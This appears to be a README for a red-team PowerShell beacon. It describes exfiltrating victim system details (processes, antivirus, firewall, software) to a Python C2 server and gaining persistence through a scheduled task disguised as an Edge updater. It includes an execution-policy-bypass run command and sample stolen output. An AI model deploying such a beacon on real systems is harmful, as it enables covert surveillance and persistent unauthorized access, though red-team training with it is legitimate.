# GhostCOM

> A COM-based PowerShell beacon for red team persistence using Task Scheduler.

## Overview
GhostCOM is a custom red team beacon built with PowerShell and Python that demonstrates persistence via the COM-based `Schedule.Service` interface. The beacon collects system information and sends it to a custom C2 server.

## Features
- COM-based persistence using Task Scheduler (`Schedule.Service`)
- Beacon sends victim system info to C2
- Two versions:
  - **Basic**: OS version, username, PC name, IP
  - **Advanced**: Active processes, firewall status, and more
- Custom C2 built in Python

## How It Works
1. PowerShell script runs on target machine.
2. Collects system information (based on version).
3. Sends info to attacker's C2 server.
4. Sets up persistence using `Schedule.Service` to auto-run on boot.

## C2 Server
The C2 is a custom Python-based HTTP listener that receives incoming system information from beacons.

> Currently, only hardcoded data is sent. Shell functionality is **not** implemented (yet).
---

## How to Execute

### Prerequisites
- Windows machine (target system)
- PowerShell (v5+ recommended)
- Python-based C2 server running (e.g., python c2_server.py on attacker's machine)
- Adjust the IP (`http://192.168.1.193/`) in the script to point to your actual C2 listener

---

### ⚡ Execution Steps

1. **Start C2 Server on Attacker:**

  ```bash
  ┌──(synix㉿0day)-[~/Desktop]
  └─$ python3 C2.py 
  [+] C2 Server Running on Port 80...
  ``` 

2. **Execute script on Target:**

  ```powershell
  powershell.exe -ExecutionPolicy Bypass -File .\beacon.ps1
  ```

3. **What Happens:**

   One-time system info is sent to your C2 server.

   A scheduled task (MicrosoftEdgeUpdaterService) is created to re-run a silent beacon on every logon.

4. **C2 retrives the data:**
 
  ```shell
  ──(synix㉿0day)-[~/Desktop]
  └─$ python3 C2.py
   [+] C2 Server Running on Port 80...

   [+] Beacon Data Received:
   Processes: Name                         CPU
   ----                         ---
   SearchApp               2.359375
   explorer                1.953125
   powershell               1.21875
   RuntimeBroker           0.828125
   StartMenuExperienceHost 0.609375
   Time: 22-05-2025 18:21:26
   Av: Windows Defender
   Hostname: BLACKSITE-10
   Os: Microsoft Windows 10 Pro
   Uptime: 22-05-2025 18:20:58
   Software: Oracle VirtualBox Guest Additions 7.1.6, Microsoft Visual C   2022 X64 Minimum Runtime - 14.44.34918, 
   Application Verifier x64 External Package, vs_minshellinteropx64msi, Application Verifier x64 External Package (DesktopEditions), 
   Microsoft Visual C   2022 X64 Debug Runtime - 14.44.34918, vs_devenx64vmsi...
   Firewall: Name    Enabled
   ----    -------
   Domain     True
   Private    True
   Public     True
   User: RTO
   192.168.1.11 - - [22/May/2025 18:21:24] "POST /collect HTTP/1.1" 200 -
   ```


> [!CAUTION]
> This tool is provided for educational and research purposes only. Use only in controlled environments with proper authorization. The author is not responsible for any misuse.


## Future Plans
- Add shell functionality to beacon
- Encrypt beacon-C2 communication
- More functionality to beacon
